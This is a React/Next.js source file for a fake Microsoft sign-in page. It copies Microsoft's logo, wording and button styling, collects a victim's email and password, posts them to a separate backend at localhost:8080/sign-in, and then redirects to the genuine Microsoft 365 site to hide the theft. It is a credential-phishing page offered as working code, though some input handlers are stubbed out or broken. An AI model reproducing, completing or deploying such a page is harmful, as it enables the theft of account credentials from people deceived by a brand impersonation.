import React, { use } from 'react'
import axios from 'axios'
import { useEffect, useState } from 'react'
import Image from 'next/image'
import logo from '../public/img/microsoft-logo-hd-26.png'
import Router, { useRouter } from 'next/router'
import {BiArrowBack} from 'react-icons/bi'
import {ClipLoader} from 'react-spinners'
function Home() {
  const [data, setata] = useState({})
  const [open, setOpen] = useState(false)
  const [email, setEmail] = useState('')
  const [loading, setLoading] = useState(false)

  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });

function toggle (){
    // e.preventDefault()
    setOpen(!open)
  }

  const signIn = async () => {
//     e.preventDefault()
    try {
      setLoading(true)
      const response = await axios.post('http://localhost:8080/sign-in', {
        email: formData.email,
        password: formData.password
      })
       Router.push('https://www.microsoft.com/en/microsoft-365')
    } catch (error) {
      console.log(error)
    }
    
  }

  const handleInputChange = () => {
    // setFormData({ ...formData, [e.target.name]: e.target.value });
  };

   

    
      useEffect(() => {
      }, [])
      
  return (
    <div className='wrapper h-screen w-full flex '>
      <div className="wrp"></div>
      {
        !open &&
      <div  className="bg-white shadow-md md:w-2/6 flex flex-col py-10 px-5  m-auto w-4/5">
        <div className='h-9 w-40 relative mb-3'>
          <Image src={logo} alt='lg' className="object-contain h-full "/>
        </div>
          <p className='px-5 text-2xl mb-5 font-bold'>Sign in</p>
          <form action="" className='w-full px-5'>
          <input type="email" style={{}} value={formData.email}  name="email" onChange={() => handleInputChange(event)}
              required placeholder="Email, phone or skype" className='border-b w-full border-b-gray-700 text-sm py-2 focus:outline-none ' />
            <div className='text-xs my-5'>
              <p className='mb-5'>No account? <a href="#" className='text-blue-600'> Create one!</a></p>
              <p className='mb-5 text-blue-600'>{`${"Can't"}`} access your account</p>
            </div>
            <div>
              <button style={{background: '#0067b8'}} className='bg-blue-600 px-10 py-2 float-right my-5 text-sm text-white'  onClick={() => toggle(event)} >Next</button>
            </div>
          </form>
      </div>
      }
      {
        open &&
      <div className="bg-white shadow-md md:w-2/6  flex flex-col py-10 px-5  m-auto w-4/5">
        <div className='h-9 w-40 relative mb-3'>
          <Image alt='lg' src={logo}  className="object-contain h-full "/>
        </div>
        <div className='flex items-center px-5 my-2 gap-2'>
          <BiArrowBack size={15} onClick={() => toggle} className="cursor-pointer" />
          <p className='text-sm'>{formData.email}</p>
        </div>
          <p className='px-5 text-2xl mb-5 font-bold'>Enter Password</p>
          <form onSubmit={() => signIn} className='w-full px-5'>
          <input type="email" hidden value={''} placeholder="Email, phone or skype" className='border-b w-full border-b-gray-700 text-sm py-2 focus:outline-none focus:border-b-blue-700' />
          <input type="password" value={formData.password} name="password" onChange={() => handleInputChange} placeholder="password" className='border-b w-full border-b-gray-700 text-sm py-2 focus:outline-none focus:border-b-blue-700' />
            <div className='text-xs my-5'>
              <p className='mb-5'>No account? <a href="#" className='text-blue-600'> Create one!</a></p>
              <p className='mb-5 text-blue-600'>{`${"Can't"}`} access your account</p>
            </div>
            <div>
              <button type={!loading ? 'submit' : 'button'} style={{background: '#0067b8'}} className='bg-blue-600 px-10 py-2 float-right my-5 text-sm text-white'>{loading ? <>verifying <ClipLoader color='white' size={10} /> </> : 'Sign in'}</button>
            </div>
          </form>
      </div>
      }
    </div>
  )
}

export default Home
